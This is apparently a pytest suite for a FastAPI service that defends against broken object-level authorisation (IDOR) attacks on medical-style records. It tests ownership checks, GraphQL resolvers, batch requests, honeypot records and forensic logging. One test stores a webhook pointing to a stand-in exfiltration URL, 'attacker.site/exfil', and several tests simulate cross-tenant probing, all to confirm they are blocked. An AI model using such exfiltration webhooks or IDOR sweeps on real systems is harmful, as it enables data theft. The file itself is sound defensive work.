"""Comprehensive test suite for all 9 Advanced BOLA Defense Features.

Covers:
  1. Write & Mutation BOLA (PUT, PATCH, DELETE with verb-weighted strikes)
  2. Hierarchical / Parent-Child Relational Validation
  3. JSON Body-Payload Object ID Parsing Middleware
  4. Batch / Bulk Array BOLA Evaluation
  5. Asynchronous Job & Worker Context Propagation
  6. GraphQL Graph Traversal & AST Resolver Hooks
  7. Second-Order Stored BOLA Validation
  8. Dynamic ABAC & Field-Level Redaction
  9. Canary / Honeypot Decoy Trap Records
"""
import time
import json
import pytest
from fastapi.testclient import TestClient

from app import (
    app,
    db,
    engine,
    DEMO_TENANT_ID,
    ADMIN_ROLE,
    ADMIN_PASSWORD,
    DEMO_PASSWORD,
    seed_demo_tenant,
    execute_async_job,
    generate_job_proof,
)

client = TestClient(app)


def auth_headers(subject: str, password: str = DEMO_PASSWORD) -> dict:
    res = client.post("/auth/login", json={"subject": subject, "password": password})
    if res.status_code != 200:
        client.post("/auth/register", json={"subject": subject, "password": password})
        res = client.post("/auth/login", json={"subject": subject, "password": password})
    assert res.status_code == 200, f"Login failed for {subject}: {res.text}"
    token = res.json()["access_token"]
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture(autouse=True)
def setup_clean_state():
    """Wipes and reseeds demo tenant before each test."""
    seed_demo_tenant(force=True)
    engine.reset(DEMO_TENANT_ID)
    yield


# ============================================================================
# FEATURE 1: WRITE & MUTATION BOLA (PUT, PATCH, DELETE)
# ============================================================================

def test_f1_owner_mutation_put_patch_delete():
    """Record owner (Alice) can update, patch, and delete their own record."""
    headers = auth_headers("alice")
    # PUT update
    res = client.put("/records/1", headers=headers, json={"data": "updated vitals data"})
    assert res.status_code == 200
    assert res.json()["status"] == "updated"
    assert res.json()["record"]["data"] == "updated vitals data"

    # PATCH update
    res_patch = client.patch("/records/1", headers=headers, json={"data": "partially patched vitals"})
    assert res_patch.status_code == 200
    assert res_patch.json()["status"] == "patched"
    assert "partially patched" in res_patch.json()["record"]["data"]

    # DELETE record 2 (also owned by Alice)
    res_del = client.delete("/records/2", headers=headers)
    assert res_del.status_code == 200
    assert res_del.json()["status"] == "deleted"

    # Verify deleted
    res_get = client.get("/records/2", headers=headers)
    assert res_get.status_code == 403 or res_get.status_code == 404


def test_f1_unauthorized_mutation_denied_with_weighted_risk():
    """Unauthorized PUT/PATCH by Bob on Alice's record is denied and incurs weighted risk."""
    headers = auth_headers("bob")
    # Record 1 is owned by Alice
    res = client.put("/records/1", headers=headers, json={"data": "malicious overwrite"})
    assert res.status_code == 403
    assert res.json()["detail"]["outcome"] == "denied"

    # Check risk telemetry
    risk = client.get("/risk/bob").json()
    assert risk["score"] >= 40
    assert "unauthorized_write_mutation_attempt" in risk["signals"]


def test_f1_unauthorized_delete_triggers_heavy_weighted_strike():
    """Unauthorized DELETE triggers immediate heavy penalty (weight 3.0 -> 75 risk points)."""
    headers = auth_headers("attacker_1")
    res = client.delete("/records/1", headers=headers)
    assert res.status_code == 403

    risk = client.get("/risk/attacker_1").json()
    assert risk["score"] >= 70
    assert "unauthorized_write_delete_attempt" in risk["signals"]


# ============================================================================
# FEATURE 2: HIERARCHICAL / PARENT-CHILD RELATIONAL VALIDATION
# ============================================================================

def test_f2_hierarchical_chain_valid_succeeds():
    """Valid hierarchy chain (org_demo -> dept_cardiology -> record 1) succeeds."""
    headers = auth_headers("alice")
    chain = [
        {"type": "organization", "id": "org_demo"},
        {"type": "department", "id": "dept_cardiology"},
        {"type": "record", "id": "1"},
    ]
    res = client.post("/hierarchy/access", headers=headers, json={"chain": chain, "action": "read"})
    assert res.status_code == 200
    assert res.json()["outcome"] == "allowed"
    assert res.json()["leaf"]["resource_id"] == "1"


def test_f2_hierarchical_chain_mismatch_detected():
    """Cross-tenant / cross-parent chain mismatch is detected and rejected."""
    headers = auth_headers("alice")
    # dept_rival_oncology belongs to org_rival, NOT org_demo
    chain = [
        {"type": "organization", "id": "org_demo"},
        {"type": "department", "id": "dept_rival_oncology"},
        {"type": "record", "id": "55"},
    ]
    res = client.post("/hierarchy/access", headers=headers, json={"chain": chain, "action": "read"})
    assert res.status_code == 403
    detail = res.json()["detail"]
    assert "Relational chain mismatch" in str(detail["violations"])

    risk = client.get("/risk/alice").json()
    assert "relational_chain_mismatch" in risk["signals"]


def test_f2_hierarchical_dynamic_node_creation():
    """Dynamically registers new arbitrary hierarchy nodes and validates their chain."""
    headers = auth_headers("alice")
    # Register workspace -> project -> record
    client.post("/hierarchy/nodes", headers=headers, json={
        "resource_type": "workspace", "resource_id": "ws_alpha", "parent_type": None, "parent_id": None
    })
    client.post("/hierarchy/nodes", headers=headers, json={
        "resource_type": "project", "resource_id": "proj_beta", "parent_type": "workspace", "parent_id": "ws_alpha"
    })
    client.post("/hierarchy/nodes", headers=headers, json={
        "resource_type": "record", "resource_id": "1", "parent_type": "project", "parent_id": "proj_beta"
    })

    valid_chain = [
        {"type": "workspace", "id": "ws_alpha"},
        {"type": "project", "id": "proj_beta"},
        {"type": "record", "id": "1"},
    ]
    res = client.post("/hierarchy/access", headers=headers, json={"chain": valid_chain, "action": "read"})
    assert res.status_code == 200
    assert res.json()["outcome"] == "allowed"


# ============================================================================
# FEATURE 3: JSON BODY-PAYLOAD OBJECT ID PARSING MIDDLEWARE
# ============================================================================

def test_f3_body_payload_middleware_unauthorized_foreign_id():
    """Middleware scans POST JSON body, extracts foreign record ID, and flags BOLA attempt."""
    headers = auth_headers("alice")
    # Alice sends a POST request containing Bob's record ID (55) in a payload field
    client.post("/hierarchy/nodes", headers=headers, json={
        "resource_type": "report",
        "resource_id": "rep_99",
        "parent_type": "record",
        "parent_id": "55"  # Bob's record
    })
    risk = client.get("/risk/alice").json()
    assert risk["score"] > 0
    assert any("body_payload" in s or "unauthorized" in s for s in risk["signals"])


def test_f3_body_payload_middleware_allows_owned_id():
    """Referencing own record ID in JSON body does not record unauthorized BOLA events."""
    headers = auth_headers("alice")
    client.post("/hierarchy/nodes", headers=headers, json={
        "resource_type": "report",
        "resource_id": "rep_100",
        "parent_type": "record",
        "parent_id": "1"  # Alice's own record
    })
    risk = client.get("/risk/alice").json()
    assert "body_payload_object_injection" not in risk["signals"]


# ============================================================================
# FEATURE 4: BATCH / BULK ARRAY BOLA EVALUATION
# ============================================================================

def test_f4_batch_mixed_owned_and_foreign_records():
    """Batch endpoint correctly evaluates mixed owned and unowned IDs with partial success."""
    headers = auth_headers("alice")
    # Records 1, 2 belong to Alice; records 55, 56 belong to Bob
    res = client.post("/records/batch", headers=headers, json={
        "record_ids": ["1", "2", "55", "56"],
        "action": "read"
    })
    assert res.status_code == 200
    data = res.json()
    assert data["total"] == 4
    assert data["allowed"] == 2
    assert data["denied"] == 2
    assert data["blocked_mid_batch"] is False

    allowed_ids = [r["record_id"] for r in data["results"] if r["status"] == "allowed"]
    denied_ids = [r["record_id"] for r in data["results"] if r["status"] == "denied"]
    assert set(allowed_ids) == {"1", "2"}
    assert set(denied_ids) == {"55", "56"}


def test_f4_batch_exceeding_max_limit_rejected():
    """Batch exceeding BOLA_MAX_BATCH_SIZE returns 400."""
    headers = auth_headers("alice")
    excessive_ids = [str(i) for i in range(1, 100)]
    res = client.post("/records/batch", headers=headers, json={"record_ids": excessive_ids})
    assert res.status_code == 400
    assert "exceed" in res.json()["detail"].lower()


def test_f4_batch_mid_batch_blocking_escalation():
    """Accumulating unauthorized accesses in a single batch trips blocking mid-batch."""
    headers = auth_headers("attacker_2")
    # Probe 10 foreign records (51 to 60)
    foreign_ids = [str(i) for i in range(51, 61)]
    res = client.post("/records/batch", headers=headers, json={"record_ids": foreign_ids})
    assert res.status_code == 200
    data = res.json()
    # At least some should be blocked_mid_batch
    assert data["blocked"] > 0
    assert data["blocked_mid_batch"] is True
    blocked_items = [r for r in data["results"] if r["status"] in ("blocked", "blocked_mid_batch")]
    assert len(blocked_items) > 0


# ============================================================================
# FEATURE 5: ASYNCHRONOUS JOB & WORKER CONTEXT PROPAGATION
# ============================================================================

def test_f5_async_job_creation_and_worker_execution():
    """Alice enqueues a job for her record; worker verifies HMAC proof and executes."""
    headers = auth_headers("alice")
    res = client.post("/jobs", headers=headers, json={"resource_id": "1", "action": "export"})
    assert res.status_code == 200
    job_id = res.json()["job_id"]
    assert job_id.startswith("job_")

    # Worker execution
    exec_res = client.post(f"/jobs/{job_id}/execute", headers=headers)
    assert exec_res.status_code == 200
    assert exec_res.json()["status"] == "completed"
    assert exec_res.json()["result"]["id"] == "1"


def test_f5_async_job_unauthorized_resource_rejected_at_enqueue():
    """Bob cannot enqueue a job for Alice's record (synchronous pre-auth failure)."""
    headers = auth_headers("bob")
    res = client.post("/jobs", headers=headers, json={"resource_id": "1", "action": "export"})
    assert res.status_code == 403
    assert res.json()["detail"]["outcome"] == "denied"


def test_f5_async_job_tampered_proof_rejected():
    """Tampering with the HMAC token in DB causes worker to flag security_violation."""
    headers = auth_headers("alice")
    res = client.post("/jobs", headers=headers, json={"resource_id": "1", "action": "export"})
    job_id = res.json()["job_id"]

    # Tamper token in DB
    with db() as c:
        c.execute("UPDATE async_jobs SET pre_auth_token = 'forged_tampered_token' WHERE id = %s", (job_id,))

    # Worker execution should detect tampering
    worker_res = execute_async_job(job_id)
    assert worker_res["status"] == "security_violation"


# ============================================================================
# FEATURE 6: GRAPHQL GRAPH TRAVERSAL & RESOLVER HOOKS
# ============================================================================

def test_f6_graphql_authorized_query_succeeds():
    """GraphQL query for owned record 1 succeeds."""
    headers = auth_headers("alice")
    query = """
    query {
        record(id: "1") {
            id
            ownerId
            data
        }
    }
    """
    res = client.post("/graphql", headers=headers, json={"query": query})
    assert res.status_code == 200
    data = res.json()
    assert "errors" not in data
    assert data["data"]["record"]["id"] == "1"


def test_f6_graphql_unauthorized_query_denied():
    """GraphQL query for unowned record 55 fails with permission error and records telemetry."""
    headers = auth_headers("alice")
    query = """
    query {
        record(id: "55") {
            id
            data
        }
    }
    """
    res = client.post("/graphql", headers=headers, json={"query": query})
    assert res.status_code == 200
    data = res.json()
    assert "errors" in data
    assert "Access denied" in data["errors"][0]["message"]

    risk = client.get("/risk/alice").json()
    assert risk["score"] > 0


def test_f6_graphql_batch_records_resolver():
    """GraphQL records list query only resolves authorized records."""
    headers = auth_headers("alice")
    query = """
    query {
        records(ids: ["1", "3", "55", "56"]) {
            id
        }
    }
    """
    res = client.post("/graphql", headers=headers, json={"query": query})
    assert res.status_code == 200
    data = res.json()["data"]["records"]
    resolved_ids = [r["id"] for r in data]
    assert "1" in resolved_ids
    assert "3" in resolved_ids
    assert "55" not in resolved_ids
    assert "56" not in resolved_ids


# ============================================================================
# FEATURE 7: SECOND-ORDER STORED BOLA VALIDATION
# ============================================================================

def test_f7_stored_reference_phase1_creation_defense():
    """Storing a reference pointing to an unauthorized foreign resource is blocked at write time."""
    headers = auth_headers("alice")
    res = client.post("/stored-references", headers=headers, json={
        "ref_type": "webhook",
        "target_resource_id": "55",  # Bob's record
        "metadata": {"webhook_url": "https://attacker.site/exfil"}
    })
    assert res.status_code == 403
    assert res.json()["detail"]["attack_type"] == "second_order_bola"

    risk = client.get("/risk/alice").json()
    assert "second_order_bola_violation" in risk["signals"]


def test_f7_stored_reference_phase2_consumption_defense():
    """If resource ownership changes or permission lapses, stored reference is blocked at trigger time."""
    headers = auth_headers("alice")
    # Alice legitimately registers reference to record 1 (which she owns)
    create_res = client.post("/stored-references", headers=headers, json={
        "ref_type": "export_hook",
        "target_resource_id": "1",
    })
    assert create_res.status_code == 200
    ref_id = create_res.json()["ref_id"]

    # Trigger while still authorized
    trig_res = client.post(f"/stored-references/{ref_id}/trigger", headers=headers)
    assert trig_res.status_code == 200
    assert trig_res.json()["status"] == "triggered"

    # Simulate ownership transfer of record 1 to Bob
    with db() as c:
        c.execute("UPDATE records SET owner_id = 'bob' WHERE tenant_id = %s AND id = '1'", (DEMO_TENANT_ID,))

    # Trigger again: Phase 2 consumption re-validation must detect BOLA!
    trig_res2 = client.post(f"/stored-references/{ref_id}/trigger", headers=headers)
    assert trig_res2.status_code == 403
    assert trig_res2.json()["detail"]["ref_status"] == "security_flagged"


# ============================================================================
# FEATURE 8: DYNAMIC ABAC & FIELD-LEVEL REDACTION
# ============================================================================

def test_f8_abac_field_level_redaction():
    """Customer role has sensitive fields (psychiatric_notes, ssn) redacted."""
    headers = auth_headers("alice")
    res = client.get("/records/1/abac", headers=headers)
    assert res.status_code == 200
    data = res.json()
    assert data["abac_verified"] is True
    record_data = data["record"]["data"]
    assert record_data["psychiatric_notes"] == "[REDACTED]"
    assert record_data["ssn"] == "[REDACTED]"
    assert "psychiatric_notes" in data["redacted_fields"]


def test_f8_abac_field_level_view_for_doctor():
    """Admin role can view clinical psychiatric notes without redaction."""
    admin_headers = auth_headers(ADMIN_ROLE, ADMIN_PASSWORD)
    admin_res = client.get("/records/1/abac", headers=admin_headers)
    assert admin_res.status_code == 200
    assert admin_res.json()["record"]["data"]["psychiatric_notes"] != "[REDACTED]"


def test_f8_abac_dynamic_hours_policy():
    """Dynamic policy restricting access outside allowed hours is enforced."""
    admin_headers = auth_headers(ADMIN_ROLE, ADMIN_PASSWORD)
    # Register policy: contractors restricted to 9 to 17
    client.post("/admin/abac/policies", headers=admin_headers, json={
        "name": "Contractor Shift Hours",
        "effect": "allow",
        "target_role": "customer",
        "min_clearance": 0,
        "allowed_hours_start": 9,
        "allowed_hours_end": 17,
    })

    headers = auth_headers("alice")
    # Test during allowed hours (e.g. 14)
    res_allow = client.get("/records/1/abac", headers=headers, params={"hour": 14})
    assert res_allow.status_code == 200

    # Test outside allowed hours (e.g. 22)
    res_deny = client.get("/records/1/abac", headers=headers, params={"hour": 22})
    assert res_deny.status_code == 403
    assert "restricted outside 9:00 - 17:00" in str(res_deny.json()["detail"]["violations"])


# ============================================================================
# FEATURE 9: CANARY / HONEYPOT DECOY TRAP RECORDS
# ============================================================================

def test_f9_canary_trip_instant_permanent_ban():
    """Probing honeypot decoy ID '0' results in immediate Strike 3 permanent ban."""
    headers = auth_headers("attacker_3")
    res = client.get("/records/0", headers=headers)
    assert res.status_code == 403

    # Verify attacker is permanently banned (10-year lockout)
    lockout = engine.blocked_until(DEMO_TENANT_ID, "attacker_3")
    assert lockout > time.time() + 300000000.0  # ~10 years
    assert engine._ban_status(DEMO_TENANT_ID, "attacker_3") == "approved"
    assert engine.get_strike_count(DEMO_TENANT_ID, "attacker_3") == 3

    # Subsequent request is blocked by firewall
    res2 = client.get("/records/1", headers=headers)
    assert res2.status_code == 403
    assert res2.json()["detail"]["outcome"] == "blocked"


def test_f9_canary_trip_immutable_forensic_logging():
    """Canary trigger creates immutable forensic log accessible to security_admin."""
    headers = auth_headers("attacker_4")
    client.get("/records/999999", headers=headers)  # Honeypot decoy

    admin_headers = auth_headers(ADMIN_ROLE, ADMIN_PASSWORD)
    res = client.get("/admin/canary-triggers", headers=admin_headers)
    assert res.status_code == 200
    triggers = res.json()["triggers"]
    assert any(t["subject_id"] == "attacker_4" and t["canary_id"] == "999999" for t in triggers)


def test_f9_canary_trip_in_graphql():
    """Probing canary ID inside GraphQL triggers instant ban."""
    headers = auth_headers("attacker_5")
    query = """
    query {
        record(id: "canary_admin_vault") {
            id
        }
    }
    """
    res = client.post("/graphql", headers=headers, json={"query": query})
    assert res.status_code == 200
    assert "errors" in res.json()

    # Attacker 5 is permanently banned
    assert engine._ban_status(DEMO_TENANT_ID, "attacker_5") == "approved"
    assert engine.blocked_until(DEMO_TENANT_ID, "attacker_5") > time.time() + 300000000.0


def test_events_stream_sse_broadcast():
    """SSE endpoint connects and streams initial heartbeat and events."""
    assert client.get("/events/stream?max_events=1").status_code == 401
    res = client.get("/events/stream?max_events=1", headers=auth_headers(ADMIN_ROLE, ADMIN_PASSWORD))
    assert res.status_code == 200
    assert "text/event-stream" in res.headers["content-type"]
    assert "ping" in res.text
    assert "connected" in res.text


def test_redteam_campaign_execution():
    """Red Team campaign runs sequential attacks, gathers telemetry and strikes."""
    res = client.post("/redteam/campaign", json={
        "attacker_subject": "attacker_6",
        "scenario_name": "idor_sweep",
        "target_records": ["51", "52", "53", "54", "55"]
    })
    assert res.status_code == 200
    data = res.json()
    assert data["attacker_subject"] == "attacker_6"
    assert data["total_requests"] == 5
    assert len(data["steps"]) == 5
    assert data["interception_rate_percent"] > 0
    assert "verdict" in data


def test_forensic_merkle_audit_proof():
    """Merkle audit proof returns cryptographically chained hash and compliance posture."""
    headers = auth_headers("alice")
    res = client.get("/forensics/audit-proof", headers=headers)
    assert res.status_code == 200
    proof = res.json()
    assert proof["ledger_valid"] is None
    verified = client.get("/forensics/audit-proof", headers=headers, params={"expected_root": proof["merkle_root"]})
    assert verified.json()["ledger_valid"] is True
    assert proof["merkle_root"].startswith("0x")
    assert "compliance_posture" in proof
    assert proof["compliance_posture"]["owasp_api1_2023"].startswith("PROTECTED")


def test_forensic_remediation_generation():
    """Remediation generator returns Python, Node, Go snippets, Sigma, and WAF rules."""
    res = client.post("/forensics/remediation", json={
        "record_id": "55",
        "subject": "attacker_1",
        "endpoint": "/records/55"
    })
    assert res.status_code == 200
    data = res.json()
    assert "code_snippets" in data
    assert "python_fastapi" in data["code_snippets"]
    assert "nodejs_express" in data["code_snippets"]
    assert "go_gin" in data["code_snippets"]
    assert "sigma_yaml" in data["detection_rules"]
    assert "cloudflare_waf_json" in data["detection_rules"]

